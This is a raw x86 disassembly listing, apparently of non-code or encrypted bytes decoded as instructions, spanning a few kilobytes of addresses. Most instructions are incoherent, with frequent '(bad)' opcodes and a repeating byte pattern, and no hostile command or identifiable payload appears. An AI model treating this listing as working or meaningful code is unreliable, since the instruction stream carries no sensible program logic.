  4178dc:	mov    ds:0x4ed94398,al
  4178e1:	cld    
  4178e2:	xor    eax,0xafc0bbe
  4178e7:	sub    dh,bh
  4178e9:	mov    esi,0xc13540a1
  4178ee:	jmp    0x2b6:0xd7d4851f
  4178f5:	inc    ecx
  4178f6:	and    al,0xfc
  4178f8:	into   
  4178f9:	mov    ah,0xce
  4178fb:	sub    edx,DWORD PTR [ebp-0x507445a7]
  417901:	sub    DWORD PTR [ebp-0x65],ebp
  417904:	or     eax,0x1d16cff
  417909:	mov    edi,DWORD PTR [esi]
  41790b:	jno    0x417969
  41790d:	dec    edi
  41790e:	push   ebp
  41790f:	test   eax,0x0
	...
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	hlt    
  417981:	push   es
  417982:	ss leave 
  417984:	js     0x41797f
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	iret   
  41798d:	stos   BYTE PTR es:[edi],al
  41798e:	xor    DWORD PTR [ebx+0x2e],esi
  417991:	cs or  bl,dh
  417994:	(bad)  
  417995:	mov    dh,0xa9
  417997:	cli    
  417998:	mov    bl,0xb5
  41799a:	pop    ebp
  41799b:	cmp    DWORD PTR [ebx-0x71454745],0x4f
  4179a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179a3:	jno    0x4179b2
  4179a5:	ret    
  4179a6:	sub    bh,BYTE PTR [ebx+0x7]
  4179a9:	ret    
  4179aa:	cmp    ebx,0xaff5e3de
  4179b0:	fistp  WORD PTR [edx+0x4c]
  4179b3:	mov    ch,bl
  4179b5:	and    DWORD PTR [esi-0x29f6bb79],esp
  4179bb:	(bad)
  4179be:	dec    esp
  4179bf:	push   ds
  4179c0:	jp     0x417a36
  4179c2:	in     al,dx
  4179c3:	ret    0x81d2
  4179c6:	jmp    FWORD PTR ds:0x90b02744
  4179cc:	std    
  4179cd:	jo     0x4179d7
  4179cf:	bound  ecx,QWORD PTR ds:0x7c48f55b
  4179d5:	add    DWORD PTR [eax],0x142c9210
  4179db:	xchg   ebp,ecx
  4179dd:	xchg   BYTE PTR [edi+0x6e],dl
  4179e0:	inc    edx
  4179e1:	dec    ecx
  4179e2:	bound  esi,QWORD PTR [ecx+ecx*4]
  4179e5:	adc    eax,0x6b67e610
  4179ea:	fmul   DWORD PTR [ecx+0x9]
  4179ed:	sbb    BYTE PTR [edx+0x16],dh
  4179f0:	aad    0x6e
  4179f2:	adc    eax,0xde59ca2e
  4179f7:	ror    cl,1
  4179f9:	shl    al,0xec
  4179fc:	mov    al,gs:0x3daaebd4
  417a02:	push   es
  417a03:	fisttp DWORD PTR [ebx]
  417a05:	arpl   WORD PTR [eax+ebx*8+0x4f7515aa],cx
  417a0c:	mov    edx,0x8c817b40
  417a11:	and    BYTE PTR [ebp-0x44],ah
  417a14:	repnz add eax,0x1b25d17a
  417a1a:	xchg   ecx,eax
  417a1b:	adc    cl,al
  417a1d:	mov    esi,0xbbfe624a
  417a22:	cmc    
  417a23:	je     0x4179f3
  417a25:	pusha  
  417a26:	dec    ebp
  417a27:	and    eax,0xb055ecb9
  417a2c:	xchg   ebx,eax
  417a2d:	call   0xd647:0x8d8dbc88
  417a34:	retf   0xabf1
  417a37:	add    ecx,edx
  417a39:	lea    ebp,[esi+0x2f]
  417a3c:	ins    DWORD PTR es:[edi],dx
  417a3d:	jns    0x417a06
  417a3f:	ror    edx,cl
  417a41:	push   ecx
  417a42:	imul   esi,DWORD PTR [edi+0x3d81b0e9],0x5ef01f08
  417a4c:	pop    ds
  417a4d:	and    al,0x5c
  417a4f:	fwait
  417a50:	(bad)  
  417a51:	fcom   DWORD PTR [ebx]
  417a53:	xlat   BYTE PTR ds:[ebx]
  417a54:	repnz lods al,BYTE PTR ds:[esi]
  417a56:	mov    edi,0x63b61cf4
  417a5b:	(bad)  
  417a5c:	cld    
  417a5d:	mov    al,0xc0
  417a5f:	repnz inc edx
  417a61:	retf   
  417a62:	sub    DWORD PTR [edi-0x2c],0x4d
  417a66:	leave  
  417a67:	mov    ch,0x5
  417a69:	mov    dl,0xab
  417a6b:	(bad)  
  417a6c:	pop    ss
  417a6d:	mov    dh,0xd0
  417a6f:	clc    
  417a70:	mov    ds:0x9cb23165,eax
  417a75:	xchg   BYTE PTR [eax],ah
  417a77:	push   ss
  417a78:	iret   
  417a79:	shl    BYTE PTR [esi-0x7c],0x6c
  417a7d:	mov    ecx,0xc99e1334
  417a82:	xor    eax,0x2b1d3c09
  417a87:	push   0xffffffdd
  417a89:	popa   
  417a8a:	pop    esp
  417a8b:	jmp    0x54730331
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x76ee8d2d]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	push   ds
  417b0d:	mov    eax,ds:0x9f81c998
  417b12:	addr16 mov edx,edx
  417b15:	sub    bh,ch
  417b17:	test   DWORD PTR [ebx-0x789db4c],esp
  417b1d:	imul   esp,DWORD PTR [ebx-0x40],0xfffffffd
  417b21:	sub    ch,BYTE PTR [ecx+0x79a9ebc5]
  417b27:	push   0x5de7e598
  417b2c:	das    
  417b2d:	mov    ebp,0x9f8f6230
  417b32:	cmp    DWORD PTR [edx+0x22],0x7a
  417b36:	aaa    
  417b37:	icebp  
  417b38:	sti    
  417b39:	addr16 out 0xdc,eax
  417b3c:	dec    edx
  417b3d:	out    dx,eax
  417b3e:	jne    0x417af1
  417b40:	mov    al,ds:0x10ffdfed
  417b45:	jp     0x417ae1
  417b47:	mov    ebp,0x46d53ae4
  417b4c:	pop    edx
  417b4d:	cmp    al,0x47
  417b4f:	jae    0x417afc
  417b51:	fidiv  WORD PTR [eax-0x2]
  417b54:	test   BYTE PTR ds:0x88c8582c,cl
  417b5a:	mov    ds:0xc7f36cc3,al
  417b5f:	les    ecx,FWORD PTR [ecx+ebp*8-0x19]
  417b63:	cmp    bh,bl
  417b65:	add    BYTE PTR [esi+0x36],0x24
  417b69:	adc    DWORD PTR [ecx],edi
  417b6b:	inc    edi
  417b6c:	inc    ecx
  417b6d:	sbb    al,0x96
  417b6f:	cmp    eax,0x3760e823
  417b74:	nop
  417b75:	xchg   BYTE PTR [ebx-0x320c8c0e],cl
  417b7b:	xlat   BYTE PTR ds:[ebx]
  417b7c:	into   
  417b7d:	cmp    ebp,esp
  417b7f:	(bad)  
  417b80:	in     eax,dx
  417b81:	cmp    eax,0x9b81c2b8
  417b86:	mov    esi,0x88d4e9c4
  417b8b:	sub    al,0x2f
  417b8d:	sbb    DWORD PTR [eax+0x2b75be2],0xffffffe2
  417b94:	jo     0x417b36
  417b96:	js     0x417bd3
  417b98:	pop    es
  417b99:	jmp    0x40a9:0xe3a081f3
  417ba0:	add    al,0x5f
  417ba2:	inc    ebx
  417ba3:	cmp    cl,cl
  417ba5:	loopne 0x417b57
  417ba7:	loope  0x417bf3
  417ba9:	push   es
  417baa:	or     edx,DWORD PTR [edi*4+0x37419822]
  417bb1:	ret    0x282
  417bb4:	test   DWORD PTR [edx+0x13],edx
  417bb7:	xlat   BYTE PTR ds:[ebx]
  417bb8:	outs   dx,BYTE PTR ds:[esi]
  417bb9:	or     eax,0xe7da85b3
  417bbe:	out    0x2f,al
  417bc0:	jge    0x417b69
  417bc2:	and    al,0x5c
  417bc4:	jae    0x417bf6
  417bc6:	ror    DWORD PTR [ecx*1-0x3bb165f7],0x6
  417bce:	push   esi
  417bcf:	out    0x4c,eax
  417bd1:	(bad)  
  417bd2:	pop    ebx
  417bd3:	mov    al,0x1e
  417bd5:	cdq    
  417bd6:	cmc    
  417bd7:	sub    DWORD PTR [edi],0xc868b8e0
  417bdd:	mov    bl,0x90
  417bdf:	sbb    ch,BYTE PTR [ebx]
  417be1:	jle    0x417b8b
  417be3:	sub    ebx,0xc4023460
  417be9:	xlat   BYTE PTR ds:[ebx]
  417bea:	outs   dx,DWORD PTR ds:[esi]
  417beb:	and    bl,BYTE PTR [eax]
  417bed:	mov    ah,0xe
  417bef:	je     0x417c66
  417bf1:	xchg   BYTE PTR [ecx],cl
  417bf3:	repnz cmp DWORD PTR [ebx],0xffffffb9
  417bf7:	push   ecx
  417bf8:	into   
  417bf9:	fist   WORD PTR [eax]
  417bfb:	and    DWORD PTR [esi-0x10],edi
  417bfe:	xchg   edi,eax
  417bff:	popf   
  417c00:	lods   eax,DWORD PTR ds:[esi]
  417c01:	inc    ebp
  417c02:	mov    edx,0xc2254009
  417c07:	sub    ah,BYTE PTR [ecx]
  417c09:	inc    edx
  417c0a:	cs std 
  417c0c:	ss xchg edx,eax
  417c0e:	jp     0x417c0d
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x92
  417c81:	and    eax,0xfb80c8ee
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    al,0x1
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	ret    
  417c8d:	pop    edi
  417c8e:	mov    ds:0x4df6baf4,al
  417c93:	mov    BYTE PTR [ebp+0x5a896a8a],al
  417c99:	out    dx,al
  417c9a:	cmp    cl,BYTE PTR [ecx-0x12a540f4]
  417ca0:	test   BYTE PTR [esi],dh
  417ca2:	leave  
  417ca3:	pop    ds
  417ca4:	mov    ds:0x3cb06386,eax
  417ca9:	push   edi
  417caa:	and    cl,BYTE PTR [edx-0x7eab2648]
  417cb0:	jns    0x417d20
  417cb2:	in     eax,dx
  417cb3:	cmc    
  417cb4:	cli    
  417cb5:	push   es
  417cb6:	(bad)  
  417cb7:	shl    BYTE PTR [esi-0x72],1
  417cba:	rcl    BYTE PTR [ebp-0x33],0xca
  417cbe:	cmp    DWORD PTR [esi],ecx
  417cc0:	inc    ecx
  417cc1:	jno    0x417cc2
  417cc3:	push   ebp
  417cc4:	(bad)  
  417cc5:	adc    BYTE PTR [ecx+0x5763581d],dl
  417ccb:	dec    edi
  417ccc:	or     esp,DWORD PTR ds:[ebx]
  417ccf:	out    0x76,al
  417cd1:	or     al,0x7
  417cd3:	scas   al,BYTE PTR es:[edi]
  417cd4:	mov    dl,0xf9
  417cd6:	pop    ecx
  417cd7:	jnp    0x417c97
  417cd9:	push   edi
  417cda:	popa   
  417cdb:	cmp    BYTE PTR [ebx-0x6c],dh
  417cde:	mov    bh,0x9f
  417ce0:	mov    edx,0x73eef776
  417ce5:	inc    esi
  417ce6:	pop    ds
  417ce7:	push   edi
  417ce8:	cdq    
  417ce9:	sub    BYTE PTR [eax-0x78],0xea
  417ced:	xchg   esi,eax
  417cee:	xor    DWORD PTR [edx],ecx
  417cf0:	nop
  417cf1:	add    esp,esp
  417cf3:	test   al,0x68
  417cf5:	jb     0x417d68
  417cf7:	xchg   ebx,eax
  417cf8:	cdq    
  417cf9:	and    eax,0xf5fa916
  417cfe:	inc    esi
  417cff:	in     al,dx
  417d00:	arpl   di,bp
  417d02:	fisubr WORD PTR [ebp+0x39]
  417d05:	sar    BYTE PTR [edx-0x2cc171c9],cl
  417d0b:	stos   BYTE PTR es:[edi],al
  417d0c:	call   0x79375d47
  417d11:	mov    dl,BYTE PTR [eax-0x33]
  417d14:	arpl   WORD PTR [ecx],si
  417d16:	jnp    0x417ce7
  417d18:	js     0x417d3d
  417d1a:	sbb    BYTE PTR [ecx+0x1cdc4a3b],al
  417d20:	ins    BYTE PTR es:[edi],dx
  417d21:	aas    
  417d22:	cwde   
  417d23:	(bad)  
  417d25:	mov    cl,0x94
  417d27:	pop    eax
  417d28:	stos   BYTE PTR es:[edi],al
  417d29:	enter  0x168f,0x48
  417d2d:	mov    bl,0x52
  417d2f:	cmp    eax,0xaaaee53e
  417d34:	int    0x39
  417d36:	fcomp  QWORD PTR [ecx+ecx*4-0x2c3161b]
  417d3d:	pop    eax
  417d3e:	mov    ah,0xea
  417d40:	imul   dh
  417d42:	mov    ch,0x24
  417d44:	sbb    BYTE PTR [edx-0x7c],bh
  417d47:	or     DWORD PTR [esi],edi
  417d49:	mov    al,ds:0xf6566d5b
  417d4e:	in     eax,dx
  417d4f:	inc    ebx
  417d50:	or     DWORD PTR [ebx+0x27],ebx
  417d53:	jp     0x417dbc
  417d55:	stos   DWORD PTR es:[edi],eax
  417d56:	add    eax,0x4e732b8b
  417d5b:	dec    ebx
  417d5c:	mov    dl,0x94
  417d5e:	xchg   DWORD PTR [ebx],edi
  417d60:	xchg   ecx,eax
  417d61:	(bad)  
  417d62:	int3   
  417d63:	aam    0xdc
  417d65:	iret   
  417d66:	pop    edi
  417d67:	into   
  417d68:	enter  0xe478,0x81
  417d6c:	icebp  
  417d6d:	cdq    
  417d6e:	test   BYTE PTR [ebp+0x7ef6b12b],bh
  417d74:	adc    al,0x86
  417d76:	daa    
  417d77:	push   ebx
  417d78:	or     eax,0x5c52fbbe
  417d7d:	shl    BYTE PTR [ecx+0x2e0f75b2],0xdb
  417d84:	xor    eax,0xe4db6672
  417d89:	fldcw  WORD PTR [ebp-0x6a]
  417d8c:	inc    esp
  417d8d:	std    
  417d8e:	adc    DWORD PTR [eax],ebp
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	leave  
  417e01:	mov    ebx,0xfc84e2d2
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	lods   al,BYTE PTR ds:[esi]
  417e0d:	shr    DWORD PTR [ebx-0x2f],1
  417e10:	jmp    0xfdfb:0xb1ef8bc0
  417e17:	out    0x2a,eax
  417e19:	hlt    
  417e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e1b:	sbb    DWORD PTR [ebp+0x78],0x43b91893
  417e22:	adc    esp,edi
  417e24:	cdq    
  417e25:	mov    ecx,0x3d647f74
  417e2a:	sbb    eax,DWORD PTR [eax+ebp*1]
  417e2d:	not    DWORD PTR [esi]
  417e2f:	into   
  417e30:	ins    BYTE PTR es:[edi],dx
  417e31:	mov    ah,0xbb
  417e33:	sahf   
  417e34:	cmp    bh,BYTE PTR [esi+0x1283a781]
  417e3a:	jne    0x417e42
  417e3c:	fldcw  WORD PTR [ecx+0x13]
  417e3f:	or     ebx,DWORD PTR [ebx+esi*4-0x27]
  417e43:	pop    ecx
  417e44:	jb     0x417ea4
  417e46:	and    BYTE PTR [esi],dl
  417e48:	cmp    esi,DWORD PTR [ebp-0x38719e7d]
  417e4e:	imul   esi,DWORD PTR [edx+0x4b],0xffffff8f
  417e52:	js     0x417dea
  417e54:	retf   0xb4a0
  417e57:	mov    ebx,0x2f3780c0
  417e5c:	xchg   ebp,eax
  417e5d:	fwait
  417e5e:	inc    esi
  417e5f:	test   eax,0xd97d5d14
  417e64:	push   cs
  417e65:	mov    DWORD PTR [edx+ebp*4+0x51],ebp
  417e69:	dec    ebp
  417e6a:	mov    ah,0xec
  417e6c:	mov    dh,BYTE PTR ds:0x5ace27e5
  417e72:	mov    esp,0xc39bc20a
  417e77:	mov    esi,0x1c1f6268
  417e7c:	gs mov ch,0x7a
  417e7f:	dec    ebp
  417e80:	fcmovb st,st(2)
  417e82:	pop    ds
  417e83:	(bad)  
  417e84:	(bad)  
  417e85:	jle    0x417ee4
  417e87:	push   0xcf1074e0
  417e8c:	(bad)  
  417e8e:	pop    esi
  417e8f:	pop    eax
  417e90:	stos   DWORD PTR es:[edi],eax
  417e91:	repz mov edi,0xe322aaf8
  417e97:	test   edx,ebx
  417e99:	sbb    DWORD PTR [ecx+0x65],0x2d
  417e9d:	jmp    0x2028:0xb48ba9a8
  417ea4:	mov    ah,0xd2
  417ea6:	fdiv   QWORD PTR ds:0xed8d8307
  417eac:	mov    dl,0x3f
  417eae:	push   eax
  417eaf:	jmp    0x417e9f
  417eb1:	fmul   st(7),st
  417eb3:	outs   dx,DWORD PTR ds:[esi]
  417eb4:	(bad)  
  417eb5:	jns    0x417e5a
  417eb7:	sub    ecx,DWORD PTR [eax]
  417eb9:	fs push ebp
  417ebb:	pop    ecx
  417ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ebd:	inc    ebx
  417ebe:	leave  
  417ebf:	jnp    0x417e57
  417ec1:	dec    ebp
  417ec2:	imul   ecx,DWORD PTR [eax+edi*2],0xffffffa9
  417ec6:	aaa    
  417ec7:	mov    bl,0x21
  417ec9:	fdivr  QWORD PTR [ebx+0x30b2efab]
  417ecf:	in     al,0x41
  417ed1:	cld    
  417ed2:	xor    DWORD PTR [ecx],ecx
  417ed4:	push   es
  417ed5:	pop    eax
  417ed6:	in     eax,dx
  417ed7:	jae    0x417ebb
  417ed9:	mov    edi,0x88888a3f
  417ede:	dec    ebp
  417edf:	lods   eax,DWORD PTR ds:[esi]
  417ee0:	loopne 0x417f16
  417ee2:	popa   
  417ee3:	jne    0x417ee3
  417ee5:	mov    cl,0x5a
  417ee7:	call   0x5b5fecc
  417eec:	pop    edi
  417eed:	xchg   BYTE PTR [esi],cl
  417eef:	in     eax,dx
  417ef0:	int3   
  417ef1:	or     dl,BYTE PTR [edi]
  417ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef4:	sbb    BYTE PTR [edx-0x30],bl
  417ef7:	out    dx,al
  417ef8:	push   ebp
  417ef9:	out    dx,eax
  417efa:	dec    edx
  417efb:	mov    dl,0x29
  417efd:	push   eax
  417efe:	mov    ch,0x2b
  417f00:	xor    al,0xb0
  417f02:	fisttp DWORD PTR [ebp+0x2]
  417f05:	ror    DWORD PTR [edi],cl
  417f07:	out    0xe2,al
  417f09:	jg     0x417f1e
  417f0b:	shl    DWORD PTR [eax],cl
  417f0d:	push   edi
  417f0e:	sbb    ebx,DWORD PTR [ebx+0x0]
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	cmp    dl,BYTE PTR [esi-0x277b61a]
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	in     eax,0xa2
  417f8e:	test   al,0x56
  417f90:	ficom  WORD PTR [ecx-0x45d40f6a]
  417f96:	or     al,BYTE PTR [ebx+0x4a]
  417f99:	dec    ebp
  417f9a:	ins    DWORD PTR es:[edi],dx
  417f9b:	(bad)  
  417f9c:	das    
  417f9d:	dec    edi
  417f9e:	into   
  417f9f:	push   edx
  417fa0:	cmp    BYTE PTR [ecx+0x34],ch
  417fa3:	outs   dx,BYTE PTR ds:[esi]
  417fa4:	scas   al,BYTE PTR es:[edi]
  417fa5:	pop    ebx
  417fa6:	das    
  417fa7:	mov    BYTE PTR [ecx],dh
  417fa9:	daa    
  417faa:	cwde   
  417fab:	xor    eax,0xa6f0f48d
  417fb0:	test   BYTE PTR [eax-0x4d],0xd4
  417fb4:	mov    dl,0x9f
  417fb6:	dec    esp
  417fb7:	inc    ecx
  417fb8:	popf   
  417fb9:	xor    edi,ebp
  417fbb:	mov    eax,0x15cc75b0
  417fc0:	push   es
  417fc1:	and    al,0xa2
  417fc3:	or     DWORD PTR [edi],ebx
  417fc5:	vpcmpeqb ymm2,ymm0,YMMWORD PTR [eax]
  417fc9:	mov    cs,WORD PTR [edi-0x44fa042a]
  417fcf:	jnp    0x417fc0
  417fd1:	aaa    
  417fd2:	in     al,0x98
  417fd4:	or     al,0x5
  417fd6:	sub    BYTE PTR [ecx+0x35ab004f],cl
  417fdc:	mov    eax,ds:0xd3acb669
  417fe1:	ret    0xd88f
  417fe4:	imul   ebp,DWORD PTR [esi],0xeab964ea
  417fea:	into   
  417feb:	les    esi,FWORD PTR [ecx]
  417fed:	into   
  417fee:	xchg   ecx,eax
  417fef:	jecxz  0x417f9b
  417ff1:	iret   
  417ff2:	cdq    
  417ff3:	in     eax,dx
  417ff4:	(bad)  
  417ff5:	and    edx,ecx
  417ff7:	cmp    eax,0xd4d7375d
  417ffc:	push   ecx
  417ffd:	js     0x417fc2
  417fff:	jg     0x417f81
  418001:	mov    al,0x89
  418003:	dec    edx
  418004:	mov    ch,0xff
  418006:	push   ebp
  418007:	aad    0xaa
  418009:	add    esp,DWORD PTR ds:0x748306be
  41800f:	aas    
  418010:	mov    eax,0x37c87b9a
  418015:	lds    ebp,FWORD PTR [ebx+0x2a]
  418018:	and    al,0xb1
  41801a:	mov    ds:0xf6dbcff4,eax
  41801f:	scas   al,BYTE PTR es:[edi]
  418020:	imul   ebp,DWORD PTR [edx],0x63
  418023:	push   ebp
  418024:	cmp    bh,0x42
  418027:	dec    esi
  418028:	dec    ecx
  418029:	loopne 0x418013
  41802b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41802c:	inc    edx
  41802d:	pop    ebx
  41802e:	jmp    0x417fbb
  418030:	(bad)  [ebx+0x9cc9858]
  418036:	jp     0x41808a
  418038:	scas   eax,DWORD PTR es:[edi]
  418039:	in     al,0xeb
  41803b:	data16 sbb bh,BYTE PTR [esi+0x6d]
  41803f:	inc    ebp
  418040:	cld    
  418041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418042:	and    ah,BYTE PTR [ebp-0x7a2371d5]
  418048:	mov    ebx,0x82f3c3cc
  41804d:	push   cs
  41804e:	add    al,0x7f
  418050:	add    ebx,DWORD PTR [ebx]
  418052:	adc    BYTE PTR [edx+0xa],ch
  418055:	push   0x85ce3e82
  41805a:	bswap  esi
  41805c:	mov    ch,0x4e
  41805e:	xchg   edi,eax
  41805f:	pop    eax
  418060:	pop    ebp
  418061:	fisubr WORD PTR [eax]
  418063:	pop    edx
  418064:	fdivp  st(2),st
  418066:	jns    0x418096
  418068:	mov    esp,esi
  41806a:	pusha  
  41806b:	xchg   ecx,eax
  41806c:	push   edi
  41806d:	leave  
  41806e:	leave  
  41806f:	not    DWORD PTR [ebx]
  418071:	jns    0x417ff9
  418073:	cli    
  418074:	aas    
  418075:	sub    eax,0xea962603
  41807a:	xor    BYTE PTR [eax-0x19],dh
  41807d:	retf   
  41807e:	inc    edi
  41807f:	loopne 0x41806c
  418081:	icebp  
  418082:	adc    BYTE PTR [ecx],0x4e
  418085:	push   0xffffff84
  418087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418088:	ins    DWORD PTR es:[edi],dx
  418089:	inc    esp
  41808a:	jo     0x4180a9
  41808c:	loopne 0x4180d7
  41808e:	mov    ds:0x1c,al
	...
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xa2fdebc,eax
  418101:	mov    esi,0xfe8cf95c
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	sbb    al,bh
  41810e:	pop    ds
  41810f:	cli    
  418110:	and    DWORD PTR [ecx-0x14],eax
  418113:	push   cs
  418114:	jp     0x41810d
  418116:	push   edi
  418117:	sub    al,0x52
  418119:	jl     0x4180a5
  41811b:	pushf  
  41811c:	xchg   edx,eax
  41811d:	jmp    0xe22d573c
  418122:	push   esp
  418123:	js     0x4180a9
  418125:	push   ds
  418126:	sbb    eax,DWORD PTR [edx-0x335f5cce]
  41812c:	stc    
  41812d:	aad    0x14
  41812f:	dec    ecx
  418130:	jo     0x4180fd
  418132:	hlt    
  418133:	adc    edx,DWORD PTR [esi]
  418135:	mov    ah,0xae
  418137:	mov    cl,0xef
  418139:	xchg   BYTE PTR [eax-0xf9f8f52],bl
  41813f:	xchg   edx,eax
  418140:	lock pop edx
  418142:	call   0xf10d:0x4af28b67
  418149:	sbb    BYTE PTR [edx],bh
  41814b:	sbb    al,0x15
  41814d:	mov    ecx,0xa896af95
  418152:	arpl   WORD PTR [edi],sp
  418154:	mov    bh,0x8d
  418156:	xlat   BYTE PTR ds:[ebx]
  418157:	or     bl,dh
  418159:	data16 ss jb 0x418151
  41815d:	mov    ch,0x2c
  41815f:	xchg   edi,eax
  418160:	inc    edx
  418161:	mov    dh,0x59
  418163:	enter  0xccfa,0xf4
  418167:	jo     0x41810c
  418169:	mov    DWORD PTR [edx],edi
  41816b:	loopne 0x4181d2
  41816d:	sbb    dl,BYTE PTR [ebx+0x3203d5aa]
  418173:	pop    ss
  418174:	sbb    BYTE PTR [ebp-0x67b887de],bh
  41817a:	mov    ah,0xa4
  41817c:	fisubr DWORD PTR [esi-0x5ab0d755]
  418182:	or     dl,0xb
  418185:	sbb    DWORD PTR [esi],edi
  418187:	cmp    dl,al
  418189:	mov    eax,0xc4f77f59
  41818e:	mov    dl,0x84
  418190:	repz xor bh,BYTE PTR [edi-0x71]
  418194:	sbb    bh,BYTE PTR [edi]
  418196:	push   esp
  418197:	gs pop ecx
  418199:	push   edi
  41819a:	(bad)  
  41819b:	out    dx,eax
  41819c:	iret   
  41819d:	imul   ebx,DWORD PTR [ecx+0x7b],0x30c98cb7
  4181a4:	pop    esi
  4181a5:	ins    DWORD PTR es:[edi],dx
  4181a6:	mov    dh,0x5c
  4181a8:	jg     0x4181a0
  4181aa:	adc    DWORD PTR [edi-0x11],esp
  4181ad:	jl     0x4181e7
  4181af:	push   edi
  4181b0:	pushf  
  4181b1:	push   0xffffff8f
  4181b3:	stos   BYTE PTR es:[edi],al
  4181b4:	cli    
  4181b5:	mov    edi,0x1cac43ad
  4181ba:	jle    0x4181ea
  4181bc:	or     cl,BYTE PTR [ebp-0x42]
  4181bf:	pusha  
  4181c0:	or     DWORD PTR [ebx],ecx
  4181c2:	jle    0x418238
  4181c4:	add    BYTE PTR [eax-0x42192c79],al
  4181ca:	xchg   esi,eax
  4181cb:	push   edi
  4181cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181cd:	dec    esi
  4181ce:	xchg   DWORD PTR [ecx+0x5e],eax
  4181d1:	push   eax
  4181d2:	add    edx,DWORD PTR ds:0x2e6e191
  4181d8:	ins    DWORD PTR es:[edi],dx
  4181d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181da:	mov    dl,0x13
  4181dc:	stos   BYTE PTR es:[edi],al
  4181dd:	loop   0x41821b
  4181df:	inc    ebx
  4181e0:	outs   dx,DWORD PTR ds:[esi]
  4181e1:	inc    edi
  4181e2:	add    edx,DWORD PTR ds:0xe204f2fc
  4181e8:	xchg   esi,eax
  4181e9:	pushf  
  4181ea:	sub    esi,DWORD PTR [ebx]
  4181ec:	inc    ecx
  4181ed:	jl     0x4181e5
  4181ef:	mov    ah,0x4c
  4181f1:	sbb    esp,ebx
  4181f3:	in     eax,dx
  4181f4:	idiv   edx
  4181f6:	js     0x418220
  4181f8:	add    edi,ebx
  4181fa:	and    ch,BYTE PTR [esi]
  4181fc:	popf   
  4181fd:	ja     0x41825b
  4181ff:	mov    ecx,0x623a4ef7
  418204:	cmp    DWORD PTR [ebx+0x68805bca],ecx
  41820a:	xor    al,0xe3
  41820c:	cs mov cl,0x8f
  41820f:	push   edx
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x3eafb8d6
  418282:	test   BYTE PTR [esi-0x70],dl
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	cmp    BYTE PTR [edx-0x63d1d073],ch
  418292:	add    ebx,DWORD PTR [ebx]
  418294:	mov    esi,0x5731990f
  418299:	and    esi,eax
  41829b:	pop    esp
  41829c:	sbb    al,0xc5
  41829e:	sub    eax,0xdff88bdd
  4182a3:	jmp    0x8a12:0xa18a3acf
  4182aa:	fs push eax
  4182ac:	rcl    DWORD PTR [esi+0x7101bc5c],0xe
  4182b3:	mov    esp,0xe61799d0
  4182b8:	fld    DWORD PTR [ecx-0x107c6c46]
  4182be:	mov    dh,0xcc
  4182c0:	dec    ecx
  4182c1:	cmp    al,0x42
  4182c3:	inc    ebp
  4182c4:	inc    edi
  4182c5:	fs pop ss
  4182c7:	inc    esp
  4182c8:	jnp    0x4182d8
  4182ca:	mov    edx,0x66af04e5
  4182cf:	add    DWORD PTR [edx-0x55],esp
  4182d2:	cmp    esi,DWORD PTR [ebp-0x6de0322d]
  4182d8:	or     ecx,DWORD PTR [edx+0x2f19dff0]
  4182de:	ins    BYTE PTR es:[edi],dx
  4182df:	pop    ebx
  4182e0:	aaa    
  4182e1:	aaa    
  4182e2:	iret   
  4182e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e4:	js     0x418363
  4182e6:	into   
  4182e7:	dec    esp
  4182e8:	jecxz  0x4182f1
  4182ea:	jbe    0x41830a
  4182ec:	stos   DWORD PTR es:[edi],eax
  4182ed:	xchg   esi,eax
  4182ee:	push   ecx
